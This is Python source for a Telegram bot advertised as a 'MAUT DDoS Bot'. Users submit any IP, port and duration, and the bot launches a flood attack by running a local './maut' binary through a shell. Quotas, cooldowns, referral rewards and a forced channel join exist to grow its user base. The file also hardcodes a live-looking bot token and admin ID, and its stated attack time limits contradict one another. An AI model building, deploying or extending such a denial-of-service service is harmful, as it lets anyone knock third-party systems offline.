import telebot
import subprocess
import datetime
import os
from telebot import types
import time
import re
from threading import Lock
import sqlite3

# Bot configuration
bot = telebot.TeleBot('8012969135:AAEOvqxJfRqr_iU_KMtVjIyKH9GRt7bwBo4')
admin_id = {"8167507955"}
DB_FILE = "maut_bot.db"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 300  # 5 minutes
MAX_ATTACK_TIME = 120  # 4 minutes
MAX_DAILY_ATTACKS = 10  # 10 attacks per day
ATTACKS_PER_INVITE = 2  # 2 bonus attacks per invite
IMAGE_URL = "https://t.me/gggkkkggggiii/11"
CHANNEL_ID = -1002440538814  # Channel ID to check membership
CHANNEL_LINK = "https://t.me/+R4ram7JA-yY4MWQ1"  # Channel invite link

# Initialize database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Create users table
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                     (user_id TEXT PRIMARY KEY, 
                      attacks_today INTEGER DEFAULT 0, 
                      last_attack_date TEXT,
                      total_attacks INTEGER DEFAULT 0,
                      invites INTEGER DEFAULT 0)''')
    
    # Create cooldown table
    cursor.execute('''CREATE TABLE IF NOT EXISTS cooldown 
                     (user_id TEXT PRIMARY KEY, 
                      cooldown_end TEXT)''')
    
    # Create active_attacks table
    cursor.execute('''CREATE TABLE IF NOT EXISTS active_attacks 
                     (user_id TEXT PRIMARY KEY,
                      start_time TEXT,
                      duration INTEGER)''')
    
    # Create referrals table
    cursor.execute('''CREATE TABLE IF NOT EXISTS referrals
                     (referrer_id TEXT,
                      referred_id TEXT,
                      PRIMARY KEY (referrer_id, referred_id))''')
    
    conn.commit()
    conn.close()

# Database helper functions
def db_execute(query, params=(), fetch=False):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    if fetch:
        result = cursor.fetchall()
    else:
        result = None
    conn.commit()
    conn.close()
    return result

def get_user(user_id):
    result = db_execute("SELECT * FROM users WHERE user_id=?", (user_id,), fetch=True)
    return result[0] if result else None

def create_user(user_id):
    db_execute("INSERT OR IGNORE INTO users (user_id, attacks_today, last_attack_date) VALUES (?, 0, ?)", 
               (user_id, datetime.date.today().isoformat()))

def log_attack(user_id, target, port, time):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"ID:{user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n")
    except Exception as e:
        print(f"Logging error: {e}")

def parse_time_input(time_str):
    time_str = time_str.lower()
    total_seconds = 0
    
    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
    
    for amount, unit in matches:
        amount = int(amount)
        if unit in ['day', 'd']:
            total_seconds += amount * 86400
        elif unit in ['hour', 'h']:
            total_seconds += amount * 3600
        elif unit in ['min', 'm']:
            total_seconds += amount * 60
        elif unit in ['sec', 's']:
            total_seconds += amount
    
    return total_seconds if total_seconds > 0 else None

def is_attack_active():
    result = db_execute("SELECT COUNT(*) FROM active_attacks", fetch=True)
    return result[0][0] > 0 if result else False

def add_active_attack(user_id, attack_time):
    db_execute("INSERT INTO active_attacks (user_id, start_time, duration) VALUES (?, ?, ?)",
               (user_id, datetime.datetime.now().isoformat(), attack_time))

def remove_active_attack(user_id):
    db_execute("DELETE FROM active_attacks WHERE user_id=?", (user_id,))

def get_active_attack_info():
    result = db_execute("SELECT user_id, start_time, duration FROM active_attacks LIMIT 1", fetch=True)
    if not result:
        return None
    
    user_id, start_time_str, duration = result[0]
    start_time = datetime.datetime.fromisoformat(start_time_str)
    elapsed = (datetime.datetime.now() - start_time).seconds
    remaining = max(0, duration - elapsed)
    return user_id, remaining

def get_user_attack_count(user_id):
    user = get_user(user_id)
    if not user:
        return 0
    
    # Reset daily count if it's a new day
    today = datetime.date.today().isoformat()
    if user[2] != today:
        db_execute("UPDATE users SET attacks_today=0, last_attack_date=? WHERE user_id=?", 
                  (today, user_id))
        return 0
    
    return user[1]

def increment_attack_count(user_id):
    today = datetime.date.today().isoformat()
    db_execute('''UPDATE users 
                 SET attacks_today = attacks_today + 1, 
                     last_attack_date = ?,
                     total_attacks = total_attacks + 1
                 WHERE user_id=?''', 
              (today, user_id))

def set_cooldown(user_id):
    cooldown_end = (datetime.datetime.now() + datetime.timedelta(seconds=COOLDOWN_TIME)).isoformat()
    db_execute("INSERT OR REPLACE INTO cooldown (user_id, cooldown_end) VALUES (?, ?)", 
               (user_id, cooldown_end))

def is_on_cooldown(user_id):
    result = db_execute("SELECT cooldown_end FROM cooldown WHERE user_id=?", (user_id,), fetch=True)
    if not result:
        return False
    
    cooldown_end = datetime.datetime.fromisoformat(result[0][0])
    return datetime.datetime.now() < cooldown_end

def get_cooldown_remaining(user_id):
    result = db_execute("SELECT cooldown_end FROM cooldown WHERE user_id=?", (user_id,), fetch=True)
    if not result:
        return 0
    
    cooldown_end = datetime.datetime.fromisoformat(result[0][0])
    remaining = (cooldown_end - datetime.datetime.now()).seconds
    return max(0, remaining)

def add_referral(referrer_id, referred_id):
    try:
        # Check if this is a valid new referral
        if referrer_id == referred_id:
            return False
            
        # Check if this referral already exists
        existing = db_execute("SELECT 1 FROM referrals WHERE referrer_id=? AND referred_id=?", 
                            (referrer_id, referred_id), fetch=True)
        if existing:
            return False
            
        # Create both users if they don't exist
        create_user(referrer_id)
        create_user(referred_id)
        
        # Add the referral record
        db_execute("INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)", 
                  (referrer_id, referred_id))
        
        # Give bonus to referrer
        db_execute("UPDATE users SET invites = invites + 1, attacks_today = attacks_today + ? WHERE user_id=?", 
                  (ATTACKS_PER_INVITE, referrer_id))
        
        # Give bonus to referred user
        db_execute("UPDATE users SET attacks_today = attacks_today + ? WHERE user_id=?", 
                  (ATTACKS_PER_INVITE, referred_id))
        
        return True
    except Exception as e:
        print(f"Referral error: {e}")
        return False

def get_user_stats(user_id):
    user = get_user(user_id)
    if not user:
        return None
    
    today = datetime.date.today().isoformat()
    attacks_remaining = max(0, MAX_DAILY_ATTACKS - user[1]) if user[2] == today else MAX_DAILY_ATTACKS
    invites = user[4]
    
    return {
        'attacks_today': user[1],
        'attacks_remaining': attacks_remaining,
        'total_attacks': user[3],
        'invites': invites,
        'bonus_attacks': invites * ATTACKS_PER_INVITE
    }

def check_channel_membership(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Error checking channel membership: {e}")
        return False

def send_channel_join_message(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Join Channel", url=CHANNEL_LINK))
    markup.add(types.InlineKeyboardButton("✅ I've Joined", callback_data="check_join"))
    
    bot.send_message(
        chat_id,
        "⚠️ You must join our channel to use this bot:\n\n"
        f"{CHANNEL_LINK}\n\n"
        "After joining, click the button below to verify.",
        reply_markup=markup
    )

def check_membership_wrapper(func):
    def wrapped(message):
        user_id = str(message.chat.id)
        if not check_channel_membership(user_id):
            send_channel_join_message(message.chat.id)
            return
        return func(message)
    return wrapped

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    create_user(user_id)  # Ensure user exists
    
    # Always check channel membership first
    if not check_channel_membership(user_id):
        send_channel_join_message(message.chat.id)
        return
    
    # Check for referral
    referral_success = False
    if len(message.text.split()) > 1:
        referrer_id = message.text.split()[1]
        if referrer_id.isdigit() and referrer_id != user_id:
            referral_success = add_referral(referrer_id, user_id)
    
    caption = """
🚀 *Welcome to MAUT DDoS Bot* �

*Public Access Features:*
- 10 free attacks per day
- +2 attacks for each friend you invite
- +2 attacks when you join via invite link

*Available Commands:*
/maut <ip> <port> <time> - Start attack
/mystats - Check your stats
/invite - Get your invite link
/mylogs - View your attack history
/help - Show all commands
/rules - Usage guidelines

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    
    if referral_success:
        caption += "\n🎉 You received +2 bonus attacks for joining via invite link!"
    
    try:
        bot.send_photo(
            chat_id=message.chat.id,
            photo=IMAGE_URL,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, caption, parse_mode="Markdown")
        print(f"Error sending image: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    user_id = str(call.from_user.id)
    
    if check_channel_membership(user_id):
        bot.answer_callback_query(call.id, "✅ Verification successful!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_command(call.message)  # Show start message
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet!", show_alert=True)

@bot.message_handler(commands=['maut'])
@check_membership_wrapper
def handle_attack_command(message):
    user_id = str(message.chat.id)
    create_user(user_id)  # Ensure user exists
    
    # Check if another attack is active
    active_info = get_active_attack_info()
    if active_info:
        active_user_id, remaining = active_info
        try:
            active_user = bot.get_chat(active_user_id)
            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
            return bot.reply_to(message, f"⚠️ Attack in progress by {username}. Please wait {remaining} seconds.")
        except:
            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
    
    # Check cooldown
    if is_on_cooldown(user_id):
        remaining = get_cooldown_remaining(user_id)
        return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
    
    # Check daily attack limit
    stats = get_user_stats(user_id)
    if stats['attacks_remaining'] <= 0:
        return bot.reply_to(message, f"❌ Daily limit reached (10 attacks). Invite friends for more attacks (/invite).")
    
    # Parse command
    try:
        args = message.text.split()
        if len(args) != 4:
            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>\nExample: /maut 1.1.1.1 80 60")
        
        ip = args[1]
        port = args[2]
        attack_time = args[3]
        
        # Validate IP
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
        
        # Validate port
        if not port.isdigit() or not 1 <= int(port) <= 65535:
            return bot.reply_to(message, "❌ Invalid port (1-65535)")
        
        # Validate time
        if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s)")
        
        # Show confirmation
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Start Attack", callback_data=f"start_attack|{ip}|{port}|{attack_time}"))
        
        bot.send_message(
            message.chat.id,
            f"⚡ *Attack Summary:*\n\n"
            f"🌐 IP: `{ip}`\n"
            f"🔌 Port: `{port}`\n"
            f"⏱ Time: `{attack_time}`s\n"
            f"📊 Attacks left today: {stats['attacks_remaining']-1}\n\n"
            f"Click below to confirm attack:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = str(call.from_user.id)
    
    # First check channel membership for all callbacks
    if not check_channel_membership(user_id):
        bot.answer_callback_query(call.id, "❌ Please join our channel first!", show_alert=True)
        send_channel_join_message(call.message.chat.id)
        return
    
    if call.data.startswith("start_attack"):
        _, ip, port, attack_time = call.data.split("|")
        
        try:
            # Mark attack as active
            add_active_attack(user_id, int(attack_time))
            
            # Execute attack
            subprocess.Popen(f"./maut {ip} {port} {attack_time} 900", shell=True)
            log_attack(user_id, ip, port, attack_time)
            set_cooldown(user_id)
            increment_attack_count(user_id)
            
            # Update message
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔥 *Attack Launched!* 🔥\n\n"
                     f"🌐 Target: `{ip}`\n"
                     f"🔌 Port: `{port}`\n"
                     f"⏱ Duration: `{attack_time}`s\n"
                     f"📊 Attacks left today: {get_user_stats(user_id)['attacks_remaining']}\n\n"
                     f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
                parse_mode="Markdown"
            )
            
            # Schedule attack completion message
            attack_duration = int(attack_time)
            time.sleep(attack_duration)
            
            # Send completion message
            bot.send_message(
                call.message.chat.id,
                f"✅ *Attack Completed!*\n\n"
                f"🌐 Target: `{ip}`\n"
                f"⏱ Duration: `{attack_time}`s\n\n"
                f"Cooldown: {COOLDOWN_TIME//60} minutes",
                parse_mode="Markdown"
            )
            
            # Remove from active attacks
            remove_active_attack(user_id)
            
            # Add new attack button
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
            
        except Exception as e:
            remove_active_attack(user_id)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"❌ Error: {str(e)}"
            )
    
    elif call.data == "new_attack":
        if is_on_cooldown(user_id):
            remaining = get_cooldown_remaining(user_id)
            return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
        
        bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
    
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['mystats'])
@check_membership_wrapper
def show_stats(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    stats = get_user_stats(user_id)
    if not stats:
        return bot.reply_to(message, "❌ Error getting stats.")
    
    response = f"""
📊 *Your Stats* 📊

• Attacks today: {stats['attacks_today']}/{MAX_DAILY_ATTACKS + stats['bonus_attacks']}
• Attacks remaining: {stats['attacks_remaining']}
• Total attacks: {stats['total_attacks']}
• Friends invited: {stats['invites']}
• Bonus attacks earned: {stats['bonus_attacks']}

Use /invite to get more attacks!
"""
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['invite'])
@check_membership_wrapper
def invite_command(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    bot_name = bot.get_me().username
    invite_link = f"https://t.me/{bot_name}?start={user_id}"
    
    stats = get_user_stats(user_id)
    
    response = f"""
📨 *Invite Friends & Earn Attacks* 📨

🔗 Your invite link:
{invite_link}

💎 For each friend who joins using your link:
• You get +{ATTACKS_PER_INVITE} attacks
• They get +{ATTACKS_PER_INVITE} attacks

📊 You've invited {stats['invites']} friends and earned {stats['bonus_attacks']} bonus attacks!
"""
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['mylogs'])
@check_membership_wrapper
def my_logs(message):
    user_id = str(message.chat.id)
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No attack history.")
    
    user_logs = []
    with open(LOG_FILE, "r") as f:
        for line in f:
            if str(user_id) in line or (message.from_user.username and f"@{message.from_user.username}" in line):
                user_logs.append(line)
    
    if not user_logs:
        return bot.reply_to(message, "ℹ️ No attacks found in your history.")
    
    bot.reply_to(message, f"📜 Your Attack History (last 10):\n\n" + "".join(user_logs[-10:]))

@bot.message_handler(commands=['help'])
@check_membership_wrapper
def help_command(message):
    help_text = """
🛠 *MAUT Bot Help* 🛠

*Public Commands:*
/maut <ip> <port> <time> - Start attack
/mystats - Check your stats
/invite - Get invite link
/mylogs - View your history
/rules - Usage guidelines

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['rules'])
@check_membership_wrapper
def rules_command(message):
    rules = """
📜 *Usage Rules* 📜

1. Max attack time: 240 seconds
2. 10 attacks per day (earn more by inviting friends)
3. 5 minutes cooldown between attacks
4. No concurrent attacks
5. No illegal targets

Violations will result in ban.
"""
    bot.reply_to(message, rules, parse_mode="Markdown")

# Admin commands (hidden from public)
@bot.message_handler(commands=['admin'])
def admin_stats(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return
    
    total_users = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
    today_attacks = db_execute("SELECT SUM(attacks_today) FROM users WHERE last_attack_date=?", 
                              (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
    total_attacks = db_execute("SELECT SUM(total_attacks) FROM users", fetch=True)[0][0] or 0
    total_referrals = db_execute("SELECT COUNT(*) FROM referrals", fetch=True)[0][0]
    
    response = f"""
👑 *Admin Stats* 👑

• Total users: {total_users}
• Attacks today: {today_attacks}
• Total attacks: {total_attacks}
• Total referrals: {total_referrals}
• Active attacks: {"Yes" if is_attack_active() else "No"}
"""
    bot.reply_to(message, response, parse_mode="Markdown")

# Initialize database
init_db()

# Start bot
print("⚡ MAUT Bot Started ⚡")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
